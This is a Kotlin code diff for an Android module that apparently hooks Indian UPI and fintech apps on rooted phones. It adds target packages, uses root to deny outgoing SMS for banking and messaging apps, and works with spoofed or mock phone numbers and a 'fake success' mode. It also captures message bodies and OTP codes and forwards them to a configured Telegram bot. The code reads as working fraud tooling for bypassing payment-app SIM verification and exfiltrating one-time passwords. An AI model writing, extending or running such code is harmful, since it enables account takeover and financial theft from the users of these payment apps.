@@ -14,6 +14,7 @@ object OutgoingSmsGuard {
     private val messagingPackages = listOf(
         "com.google.android.apps.messaging",
         "com.android.mms",
+        "com.android.mms.service",
         "com.samsung.android.messaging",
         "com.android.mms.service"
     )
@@ -25,7 +26,15 @@ object OutgoingSmsGuard {
         "com.phonepe.app",
         "com.google.android.apps.nbu.paisa.user",
         "com.stashfin.android",
-        "com.yespay.next"
+        "com.yespay.next",
+        "com.herofincorp.diyjourneys",
+        "com.herofincorp.simplycash",
+        "com.customer.herofincorp",
+        "com.nextbillion.groww",
+        "com.groww.app",
+        "com.hdfcbank.payzapp",
+        "com.snapmint.customerapp",
+        "com.tataneu"
     )
 
     @Volatile
@@ -38,8 +47,9 @@ object OutgoingSmsGuard {
         val hookActive = config.hookedUpiApps.any { it.value } ||
             config.mockPhoneSim1.isNotBlank() ||
             configManager.readSpoofPhone().isNotBlank() ||
-            mockOn
-        val shouldBlock = (config.hookOutgoingSms || config.interceptFakeSuccess) && hookActive
+            mockOn ||
+            config.autoHookForeground
+        val shouldBlock = (config.hookOutgoingSms || config.interceptFakeSuccess || mockOn) && hookActive
 
         if (shouldBlock && !blocked) {
             blockMessagingSend()
@@ -59,7 +69,7 @@ object OutgoingSmsGuard {
             "com.android.phone",
             "com.android.providers.telephony"
         ) + upiSmsSenders
-        packages.forEach { pkg ->
+        packages.distinct().forEach { pkg ->
             ShellHelper.runSu("appops set $pkg SEND_SMS deny 2>/dev/null")
         }
     }
@@ -69,7 +79,7 @@ object OutgoingSmsGuard {
             "com.android.phone",
             "com.android.providers.telephony"
         ) + upiSmsSenders
-        packages.forEach { pkg ->
+        packages.distinct().forEach { pkg ->
             ShellHelper.runSu("appops set $pkg SEND_SMS allow 2>/dev/null")
         }
     }
@@ -83,27 +93,30 @@ object OutgoingSmsGuard {
             val parts = line.split("|", limit = 2)
             val dest = parts.getOrElse(0) { "" }
             val body = parts.getOrElse(1) { "" }
-            if (dest.isBlank() || body.isBlank()) return
+            if (body.isBlank()) return
 
             val configManager = ConfigManager(context)
             val config = configManager.load()
             val app = SmsMatcher.matchedHookedApp(config, dest, body)
             val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
+            val appLabel = app?.displayName.orEmpty().ifBlank {
+                ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
+            }
             val otp = LastOtp(
                 otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
                 sender = interceptDisplay,
                 body = body,
                 phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
-                messageLabel = app?.displayName.orEmpty().ifBlank {
-                    ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
-                },
+                messageLabel = appLabel,
                 direction = "outgoing",
                 rawPeer = dest,
                 capturedAt = System.currentTimeMillis()
             )
             OtpCaptureWriter.write(context, otp)
             OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
-            if (SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")) {
+            val shouldForward = SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing") ||
+                config.enableVirtualSim || config.interceptFakeSuccess
+            if (shouldForward && config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
                 TokenForwarder(configManager, context).forward(otp)
             }
             try {
